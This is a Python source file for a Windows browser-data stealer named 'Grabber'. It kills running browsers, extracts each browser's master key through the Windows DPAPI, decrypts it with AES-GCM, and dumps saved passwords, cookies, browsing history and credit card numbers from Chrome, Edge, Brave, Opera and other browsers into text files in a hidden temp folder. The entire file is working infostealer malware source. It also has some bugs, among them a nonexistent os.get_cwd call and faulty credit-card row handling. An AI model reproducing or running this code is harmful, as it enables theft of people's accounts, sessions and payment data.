import os
import json
import base64
import random
import shutil
import psutil
import sqlite3
import threading

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class Grabber:
    def __init__(self, output: str = None):
        """
        :param output: Output path, if not specified, the path will be at this folder
        """
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        if output is None:
            output = os.get_cwd()

        self.output = os.path.join(output, 'BrowserData')

        if not os.path.exists(self.output):
            os.mkdir(self.output)

        self.errors = []

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)

        for proc in self.browsers_found:
            proc.kill()

        def process_browser(name: str, path: str, profile: str, func: callable) -> None:
            """
            Make sure that the program is not interrupted, when an error occurs
            """
            try:
                func(name, path, profile)
            except Exception as e:
                print(f"Error in {name} {profile} {func.__name__}: {e}")

        threads = []
        for name, path in self.browsers.items():
            if not os.path.exists(path):
                continue
                
            self.master_key = self.get_master_key(path)
            if not self.master_key is None:
                self.funcs = [
                    self.get_passwords,
                    self.get_cookies,
                    self.get_history,
                    self.get_credit_cards,
                ]
            
            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

    @staticmethod
    def get_master_key(path: str) -> str:
        """
        Get master key from the browser
        :param: path: Path to the browser
        :return: Master key of the browser or None
        """
        try:
            with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None
        
    @staticmethod
    def decrypt_password(encrypted_password: bytes, key: bytes) -> str:
        """
        Decrypt the password
        :param encrypted_password: Encrypted password
        :param key: Master key of the browser
        :return: Decrypted password or None
        """
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode(errors='ignore')
        
    @staticmethod
    def create_temp_dir(_dir: str or os.PathLike = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path

    def get_cookies(self, name: str, path: str, profile: str) -> None:
        """
        Get cookies from the browser
        :param name: Name of the browser
        :param path: Path to the browser
        :param profile: Profile of the browser
        """
        if name == 'opera' or name == 'opera-gx':
            path = os.path.join(path, 'Network', 'Cookies')
        else:
            path = os.path.join(path, profile, 'Network', 'Cookies')

        if not os.path.exists(path):
            return
        
        cookie_temp_path = self.create_temp_dir()
        shutil.copy2(path, cookie_temp_path)
        conn = sqlite3.connect(cookie_temp_path)
        cursor = conn.cursor()

        output_file = os.path.join(self.output, f'cookies.txt')
        if not os.path.exists(os.path.dirname(output_file)):
            os.makedirs(os.path.dirname(output_file))

        with open(output_file, 'a', encoding='utf-8') as f:
            for res in cursor.execute('SELECT host_key, name, encrypted_value, expires_utc FROM cookies').fetchall():
                host_key, name, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.master_key)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")

        cursor.close()
        conn.close()
        os.remove(cookie_temp_path)


    def get_history(self, name: str, path: str, profile: str) -> None:
        if name == 'opera' or name == 'opera-gx':
            path = os.path.join(path, 'History')
        else:
            path = os.path.join(path, profile, 'History')

        if not os.path.exists(path):
            return
        
        history_temp_path = self.create_temp_dir()
        shutil.copy2(path, history_temp_path)
        conn = sqlite3.connect(history_temp_path)
        cursor = conn.cursor()
        
        output_file = os.path.join(self.output, f'history.txt')
        if not os.path.exists(os.path.dirname(output_file)):
            os.makedirs(os.path.dirname(output_file))

        with open(output_file, 'a', encoding='utf-8') as f:
            for res in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title != "":
                    f.write(f"{url}\t{title}\t{visit_count}\t{last_visit_time}\n")

        cursor.close()
        conn.close()
        os.remove(history_temp_path)

    def get_passwords(self, name: str, path: str, profile: str) -> None:
        if name == 'opera' or name == 'opera-gx':
            path = os.path.join(path, 'Login Data')
        else:
            path = os.path.join(path, profile, 'Login Data')

        if not os.path.exists(path):
            return
        
        password_temp_path = self.create_temp_dir()
        shutil.copy2(path, password_temp_path)
        conn = sqlite3.connect(password_temp_path)
        cursor = conn.cursor()

        output_file = os.path.join(self.output, f'passwords.txt')
        if not os.path.exists(os.path.dirname(output_file)):
            os.makedirs(os.path.dirname(output_file))

        with open(output_file, 'a', encoding='utf-8') as f:
            for res in cursor.execute('SELECT action_url, username_value, password_value FROM logins').fetchall():
                action_url, username_value, encrypted_password = res
                password = self.decrypt_password(encrypted_password, self.master_key)
                if action_url and username_value and password != "":
                    f.write(f"{action_url}\t{username_value}\t{password}\n")

        cursor.close()
        conn.close()
        os.remove(password_temp_path)

    def get_credit_cards(self, name: str, path: str, profile: str) -> None:
        if name == 'opera' or name == 'opera-gx':
            path = os.path.join(path, 'Web Data')
        else:
            path =  os.path.join(path, profile, 'Web Data')

        if not os.path.exists(path):
            return
        
        credit_card_temp_path = self.create_temp_dir()
        shutil.copy2(path, credit_card_temp_path)
        conn = sqlite3.connect(credit_card_temp_path)   
        cursor = conn.cursor()

        output_file = os.path.join(self.output, f'credit_cards.txt')
        if not os.path.exists(os.path.dirname(output_file)):
            os.makedirs(os.path.dirname(output_file))

        with open(output_file, 'a', encoding='utf-8') as f:
            res = cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards').fetchall()
            name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified = res
            card_number = self.decrypt_password(card_number_encrypted, self.master_key)
            if name_on_card and card_number != "":
                f.write(f"{name_on_card}\t{expiration_month}\t{expiration_year}\t{card_number}\t{date_modified}\n")
        
        cursor.close()
        conn.close()
        os.remove(credit_card_temp_path)

            
if __name__ == '__main__':
    temp_path = os.path.join(
        os.getenv('temp'),
        ''.join(
            random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",k=15)
        )
    )
    os.mkdir(temp_path)

    grabber = Grabber(output=temp_path)

    print(f"Saving data to {temp_path}")